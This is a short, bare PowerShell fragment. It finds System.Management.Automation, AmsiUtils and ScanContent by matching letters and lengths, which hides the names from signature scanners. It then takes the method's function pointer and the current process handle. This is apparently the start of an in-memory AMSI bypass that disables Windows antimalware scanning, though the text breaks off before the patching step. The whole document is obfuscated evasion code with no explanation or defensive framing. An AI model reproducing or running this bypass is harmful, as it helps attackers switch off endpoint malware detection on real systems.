$Assemblies = [appdomain]::currentdomain.getassemblies()
$Assemblies |
  ForEach-Object {
    if($_.Location -ne $null){
   	 $split1 = $_.FullName.Split(",")[0]
   	 If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
   		 $Types = $_.GetTypes()
   	 }
    }
}

$Types |
  ForEach-Object {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
   		 $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
   	 }
    }
}

$Methods |
  ForEach-Object {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
  		 $MethodFound = $_
   	 }
    }
}

[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [APIs]::GetCurrentProcess()
$dummy = 0
$ApiReturn = $false
